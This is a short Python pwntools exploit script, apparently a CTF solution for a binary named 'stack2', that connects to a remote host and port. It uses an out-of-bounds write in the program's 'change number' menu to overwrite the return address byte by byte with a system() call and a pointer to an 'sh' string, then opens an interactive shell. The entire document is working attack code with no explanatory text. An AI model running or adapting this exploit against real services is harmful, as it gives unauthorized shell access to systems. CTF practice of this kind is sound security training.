from pwn import *
h,p = '111.200.241.244',56606
p = remote(h,p)
#p = process("./stack2")
#gdb.attach("stack2","b *0x80486d7")
#win = 0x0804859B
sh = [0x87,0x89,0x04,0x08]  #0x8048987
callsys = [0x50,0x84,0x04,0x08] #0x080485B4
print callsys[0],type(callsys[0]),int('0xb4',16)
p.sendline("1 1")
write_pos = 132
def exp(pos,val):
	p.sendlineafter("5. exit",'3')
	p.sendlineafter("change:",str(pos))
	p.sendlineafter("number:",str(val))
#132 133 134 135
for i in range(4):
	exp(write_pos+i,callsys[i])
write_pos+=8
for i in range(4):
	exp(write_pos+i,sh[i])
p.sendlineafter("5. exit",'5')
p.interactive()
